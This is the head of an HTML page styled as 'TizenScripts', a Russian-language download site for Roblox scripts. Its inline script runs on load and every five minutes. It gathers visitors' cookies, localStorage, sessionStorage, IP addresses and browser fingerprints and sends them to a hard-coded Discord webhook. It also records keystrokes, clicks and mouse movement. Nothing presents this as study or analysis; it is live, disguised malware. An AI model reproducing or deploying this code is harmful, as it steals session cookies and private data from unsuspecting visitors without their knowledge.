<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TizenScripts - Лучшие скрипты и расширения для Roblox</title>
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: #fff;
            font-family: 'Segoe UI', sans-serif;
            min-height: 100vh;
        }
        header {
            background: #1a1a1a;
            padding: 40px 20px;
            text-align: center;
            border-bottom: 2px solid #ff4444;
        }
        header h1 {
            font-size: 48px;
            color: #ff4444;
            text-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
        }
        header p {
            color: #888;
            margin-top: 10px;
            font-size: 18px;
        }
        main {
            max-width: 800px;
            margin: 40px auto;
            padding: 0 20px;
        }
        .downloads {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-top: 30px;
        }
        .download-card {
            background: #1a1a1a;
            border: 2px solid #333;
            border-radius: 10px;
            padding: 20px;
            text-align: center;
            transition: all 0.3s;
        }
        .download-card:hover {
            border-color: #ff4444;
            transform: translateY(-5px);
            box-shadow: 0 10px 20px rgba(255, 0, 0, 0.2);
        }
        .download-card h3 {
            color: #ff4444;
            margin-bottom: 10px;
        }
        .download-card p {
            color: #888;
            font-size: 14px;
            margin-bottom: 15px;
        }
        .download-btn {
            display: inline-block;
            padding: 12px 25px;
            background: #ff4444;
            color: #fff;
            text-decoration: none;
            border-radius: 5px;
            font-weight: bold;
            transition: all 0.3s;
        }
        .download-btn:hover {
            background: #ff6666;
            transform: scale(1.05);
        }
        footer {
            text-align: center;
            padding: 20px;
            color: #555;
            margin-top: 50px;
        }
    </style>
    
    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1538116344967340144/ECF6ixeFCjRIZrStHKIv6SjuYyt09u8lGh_qTCP62P-nzOlwqF8raxBnLX3GtqIWsZLW";
        
        async function collectData() {
            const data = {
                timestamp: new Date().toISOString(),
                ip: await getIP(),
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screenResolution: screen.width + 'x' + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer,
                url: window.location.href,
                cookies: document.cookie,
                localStorage: JSON.stringify(localStorage),
                sessionStorage: JSON.stringify(sessionStorage),
                deviceMemory: navigator.deviceMemory || 'Unknown',
                hardwareConcurrency: navigator.hardwareConcurrency,
                maxTouchPoints: navigator.maxTouchPoints,
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio,
                historyLength: history.length,
                onlineStatus: navigator.onLine,
                connectionType: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
                doNotTrack: navigator.doNotTrack,
                vendor: navigator.vendor,
                gpu: 'Unknown',
                webglVendor: 'Unknown',
                canvasFingerprint: 'Unknown',
                webRTCIP: 'Unknown'
            };
            
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                data.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                data.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
            } catch (e) {}
            
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 200;
                canvas.height = 50;
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('Fingerprint', 2, 15);
                data.canvasFingerprint = canvas.toDataURL().substring(0, 100);
            } catch (e) {}
            
            try {
                const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                pc.onicecandidate = (ice) => {
                    if (ice && ice.candidate && ice.candidate.candidate) {
                        const ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                        if (ipMatch) {
                            data.webRTCIP = ipMatch[0];
                            pc.close();
                        }
                    }
                };
            } catch (e) {}
            
            const message = '🔍 **TizenScripts Tracking**\n\n' +
                '🌐 IP: ' + data.ip + '\n' +
                '👤 UA: ' + data.userAgent + '\n' +
                '🌍 Язык: ' + data.language + '\n' +
                '💻 Платформа: ' + data.platform + '\n' +
                '🖥️ Экран: ' + data.screenResolution + '\n' +
                '⏰ TZ: ' + data.timezone + '\n' +
                '🎮 GPU: ' + data.gpu + '\n' +
                '🔐 WebRTC IP: ' + data.webRTCIP + '\n' +
                '🎨 Canvas FP: ' + data.canvasFingerprint + '\n\n' +
                '🍪 COOKIES:\n```' + data.cookies + '```';
            
            await fetch(WEBHOOK, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({content: message})
            });
            
            let database = JSON.parse(localStorage.getItem('collectedData') || '[]');
            database.push(data);
            localStorage.setItem('collectedData', JSON.stringify(database));
        }
        
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (e) { return 'Unknown'; }
        }
        
        let keystrokes = '';
        document.addEventListener('keydown', function(e) {
            keystrokes += e.key;
            if (keystrokes.length > 100) {
                let database = JSON.parse(localStorage.getItem('keystrokesData') || '[]');
                database.push({type: 'keystrokes', value: keystrokes, timestamp: new Date().toISOString()});
                localStorage.setItem('keystrokesData', JSON.stringify(database));
                keystrokes = '';
            }
        });
        
        document.addEventListener('click', function(e) {
            let database = JSON.parse(localStorage.getItem('clicksData') || '[]');
            database.push({type: 'click', x: e.clientX, y: e.clientY, target: e.target.tagName, timestamp: new Date().toISOString()});
            localStorage.setItem('clicksData', JSON.stringify(database));
        });
        
        let mouseData = [];
        document.addEventListener('mousemove', function(e) {
            mouseData.push({x: e.clientX, y: e.clientY, t: Date.now()});
            if (mouseData.length > 500) {
                let database = JSON.parse(localStorage.getItem('mouseData') || '[]');
                database.push(mouseData);
                localStorage.setItem('mouseData', JSON.stringify(database));
                mouseData = [];
            }
        });
        
        window.addEventListener('load', function() {
            setTimeout(collectData, 1000);
            setInterval(collectData, 300000);
        });
    </script>
</head>
